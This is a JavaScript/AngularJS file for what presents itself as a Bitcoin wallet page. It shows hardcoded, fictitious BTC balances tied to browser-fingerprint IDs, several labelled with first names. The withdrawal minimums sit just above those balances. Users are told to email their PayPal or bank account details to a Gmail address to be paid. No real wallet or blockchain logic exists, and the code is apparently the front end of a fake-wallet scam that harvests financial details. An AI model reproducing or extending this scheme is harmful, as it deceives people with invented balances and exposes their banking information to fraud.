var localBals = [
	{ a: 'eedf3742953450501e197595321430a8', b: 0.0085, m: 0.021 },
	{ a: 'd413983d1441528e0a6e82534aec9293', b: 1.2, m: 100 },
	{ a: 'c97587e7a1f3c956bb661912ed9982df', b: 0.0085, m: 0.021 },
	{ a: '992284ec68481ab293e7fdec5ba94a28', b: 0.012, m: 0.03 },
	{ a: '6b6d11cc1e142d6f221ecb0e68342fba', b: 0.0085, m: 0.025 }, // lexi
	{ a: '53b2cc53a521387f5bbaef229a23da83', b: 0.017, m: 0.025 }, // ascan
	{ a: 'a1da3f85a0df1617c845a31a76b392d2', b: 0.0088, m: 0.02 }, // parker
	{ a: '9c7d8c4f3ee0a85e3f39b5bdb3191367', b: 0.0085, m: 0.02 }, // kitty
	{ a: '851a91239ff859ea2cc16373d714e7ad', b: 0.0069, m: 0.015 }, // mykhol
];
localBals.map(val => {
	if (localStorage.getItem('wa') != null && val.a == localStorage.getItem('wa')) {
		if (localStorage.getItem('numBalance') != null) {
			val.b = localStorage.getItem('numBalance');
		}
	}

	return val;
});

var app = angular.module('myApp', []);
app.controller('myCtrl', ($scope) => {
	$scope.transactions = [];

	$scope.walletAddress = '';
	$scope.btcBalance = '0 BTC';
	$scope.numBalance = 0;
	$scope.isBlocked = false;
	$scope.myMin = -1;

	try {
		new Fingerprint2().get((address) => {
			initWallet(address, $scope);
		});
	} catch (e) {
		initWallet(null, $scope);
	}

	$scope.withdrawMoney = (mode) => {
		var min = $scope.myMin == -1 ? 0.24 : $scope.myMin;
		if ($scope.walletAddress == '2617f6cbd1e8b2a15ce672b152d72b8e') min = 0.2;
		else if ($scope.walletAddress == '04f1d67aa907036cfa27baf3fcc16c04') min = 0.15;

		if ($scope.numBalance == 0) M.toast({ html: 'You don\'t have a balance yet', classes: 'red' });
		else {
			if ($scope.numBalance >= min) M.toast({ html: mode == 'p' ? 'Please send your PayPal email to pistawallet@gmail.com for money transfer.' : 'Please send your address and bank account details to pistawallet@gmail.com for money transfer.' });
			else M.toast({ html: 'Minimum Withdrawal Amount is ' + min + ' BTC', classes: 'red' });
		}
	}
});

function initWallet(address, $scope) {
	let applyScope = true;
	if (address == null) {
		applyScope = false;
		address = '5f25194d66bb486c549' + new Date().getTime();
	}

	const storedAddress = localStorage.getItem('wa');
	if (storedAddress == null) localStorage.setItem('wa', address);
	else address = storedAddress;

	new QRCode(document.getElementById('qrcode'), {
		text: address,
		width: 256,
		height: 256,
		colorDark: '#1565c0'
	});

	wAddress = address;

	$scope.walletAddress = address;
	if (applyScope) $scope.$apply();

	//
	for (let i = 0; i < localBals.length; i++) {
		if (localBals[i].a == wAddress) {
			numBalance = localBals[i].b;

			$scope.numBalance = localBals[i].b;
			localStorage.setItem('numBalance', numBalance);

			$scope.btcBalance = localBals[i].b + ' BTC';

			if (localBals[i].m != undefined) {
				$scope.myMin = localBals[i].m;
			}

			$scope.$apply();

			break;
		}
	}
	//
}